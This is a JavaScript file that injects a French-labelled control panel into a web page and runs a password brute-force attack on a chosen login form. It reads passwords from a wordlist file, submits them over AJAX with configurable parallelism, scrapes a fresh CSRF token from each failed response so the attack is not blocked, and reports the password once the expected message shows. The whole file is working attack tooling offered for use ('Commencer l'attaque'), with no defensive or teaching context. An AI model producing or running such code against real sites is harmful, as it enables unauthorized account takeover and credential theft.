(function() {
  var ajax = {};
  ajax.x = function() {
    if (typeof XMLHttpRequest !== "undefined") {
      return new XMLHttpRequest();
    }
    var versions = [
      "MSXML2.XmlHttp.6.0",
      "MSXML2.XmlHttp.5.0",
      "MSXML2.XmlHttp.4.0",
      "MSXML2.XmlHttp.3.0",
      "MSXML2.XmlHttp.2.0",
      "Microsoft.XmlHttp"
    ];

    var xhr;
    for (var i = 0; i < versions.length; i++) {
      try {
        xhr = new ActiveXObject(versions[i]);
        break;
      } catch (e) {}
    }
    return xhr;
  };

  ajax.send = function(url, callback, method, data, async) {
    if (async === undefined) {
      async = true;
    }
    var x = ajax.x();
    x.open(method, url, async);
    x.onreadystatechange = function() {
      if (x.readyState == 4) {
        callback(x.responseText);
      }
    };
    if (method == "POST") {
      x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    }
    x.send(data);
  };

  ajax.get = function(url, data, callback, async) {
    var query = [];
    for (var key in data) {
      query.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
    }
    ajax.send(
      url + (query.length ? "?" + query.join("&") : ""),
      callback,
      "GET",
      null,
      async
    );
  };

  ajax.post = function(url, data, callback, async) {
    var query = [];
    for (var key in data) {
      query.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
    }
    ajax.send(url, callback, "POST", query.join("&"), async);
  };

  //  function cookies() {
  //    var cookiesList = {};
  //    var cookies = document.cookie.split(';');
  //    for (var i = 0; i < cookies.length; ++i) {
  //      var pair = cookies[ i ].trim().split('=');
  //      cookiesList[pair[0]] = pair[1];
  //    }
  //    return cookiesList;
  //  }
  //
  //  function setCookie(name, value, days) {
  //    var expires = "";
  //    if (days) {
  //      var date = new Date();
  //      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
  //      expires = "; expires=" + date.toUTCString();
  //    }
  //    document.cookie = name + "=" + (value || "") + expires + "; path=/";
  //  }

  function serialize(form) {
    if (!form || form.nodeName !== "FORM") {
      return;
    }
    var i, j;
    var q = {};
    for (i = form.elements.length - 1; i >= 0; i = i - 1) {
      if (form.elements[i].name === "") {
        continue;
      }
      switch (form.elements[i].nodeName) {
        case "INPUT":
          switch (form.elements[i].type) {
            case "text":
            case "tel":
            case "email":
            case "hidden":
            case "password":
            case "button":
            case "reset":
            case "submit":
              q[form.elements[i].name] = form.elements[i].value;
              break;
            case "checkbox":
            case "radio":
              if (form.elements[i].checked) {
                q[form.elements[i].name] = form.elements[i].value;
              }
              break;
          }
          break;
        case "file":
          break;
        case "TEXTAREA":
          q[form.elements[i].name] = form.elements[i].value;
          break;
        case "SELECT":
          switch (form.elements[i].type) {
            case "select-one":
              q[form.elements[i].name] = form.elements[i].value;
              break;
            case "select-multiple":
              for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
                if (form.elements[i].options[j].selected) {
                  q[form.elements[i].name] = form.elements[i].options[j].value;
                }
              }
              break;
          }
          break;
        case "BUTTON":
          switch (form.elements[i].type) {
            case "reset":
            case "submit":
            case "button":
              q[form.elements[i].name] = form.elements[i].value;
              break;
          }
          break;
      }
    }
    return q;
  }

  function bruteCreateInputRow(label, type, name, defaultValue) {
    var p = document.createElement("p");
    var labelEl = document.createElement("label");
    labelEl.for = name;
    labelEl.textContent = label;
    var input = document.createElement("input");
    input.id = name;
    input.name = name;
    input.type = type;
    if (typeof defaultValue !== "undefined") {
      input.value = defaultValue;
    }
    p.appendChild(labelEl);
    p.appendChild(input);
    return p;
  }

  var form = document.createElement("form");

  document.body.appendChild(form);

  form.appendChild(
    bruteCreateInputRow("Sélecteur du formulaire", "text", "form_selector")
  );
  form.appendChild(bruteCreateInputRow("Liste de mots", "file", "word_list"));
  form.appendChild(
    bruteCreateInputRow("Message attendu", "text", "displayed_message")
  );
  form.appendChild(
    bruteCreateInputRow(
      "Le message s'affiche en cas de succès",
      "checkbox",
      "on_success"
    )
  );
  form.appendChild(
    bruteCreateInputRow(
      "Nom de la propriété token CSRF",
      "text",
      "csrf_token_key"
    )
  );
  form.appendChild(
    bruteCreateInputRow("Nom de la propriété password", "text", "password_key")
  );
  form.appendChild(
    bruteCreateInputRow("Nombre de tentatives à la fois", "number", "speed", 1)
  );
  form.appendChild(
    bruteCreateInputRow("Démarrer", "submit", "start", "Commencer l'attaque")
  );

  var buttonStop = document.createElement("button");
  buttonStop.id = "stop";
  buttonStop.textContent = "Arrêter l'attaque";

  form.appendChild(buttonStop);

  var msg = document.createElement("p");

  form.appendChild(msg);

  var stopped = false;

  var data = {};

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    stopped = false;

    var loginForm = document.querySelector(
      document.getElementById("form_selector").value
    );

    var wordlistFile = document.getElementById("word_list").files[0];

    var displayedMessage = document.getElementById("displayed_message").value;

    var tokenKey = document.getElementById("csrf_token_key").value;

    var passwordKey = document.getElementById("password_key").value;

    var speed = document.getElementById("speed").value;

    var onsuccess = document.getElementById("on_success").checked;

    csrfToken = data[tokenKey] || null;

    data = serialize(loginForm);

    if (csrfToken) {
      data[tokenKey] = csrfToken;
    }

    var fr = new FileReader();

    fr.onload = function() {
      msg.textContent = "Searching...";
      var wordlist = fr.result.split("\n");
      var url = loginForm.action || "";
      url = url.replace(/#/, "");
      var passwordIndex = 0;
      var repeatedRequest = function() {
        msg.textContent =
          "Looking for " + passwordIndex + " over " + wordlist.length;
        var passwordTested = wordlist[passwordIndex++].trim();
        data[passwordKey] = passwordTested;
        var callback = function(rep) {
          if (!stopped) {
            var condition = onsuccess
              ? rep.match(displayedMessage)
              : !rep.match(displayedMessage);
            if (condition) {
              msg.textContent = "Password found : " + passwordTested;
              stopped = true;
            } else {
              var div = document.createElement("div");
              div.innerHTML = rep.replace(
                /^[\s\S]*<body.*?>|<\/body>[\s\S]*$/gi,
                ""
              );

              var tokenElement = div.querySelector('[name="' + tokenKey + '"]');

              if (tokenElement) {
                tokenValue = tokenElement.value;
                data[tokenKey] = tokenValue;
              }
              repeatedRequest();
            }
          }
        };
        if (loginForm.method.toLowerCase() === "get") {
          ajax.get(url, data, callback);
        } else {
          ajax.post(url, data, callback);
        }
      };

      for (var i = 0; i < speed; i++) {
        repeatedRequest();
      }
    };

    fr.readAsText(wordlistFile);
  });

  buttonStop.addEventListener("click", function(e) {
    e.preventDefault();
    stopped = true;
  });
})();
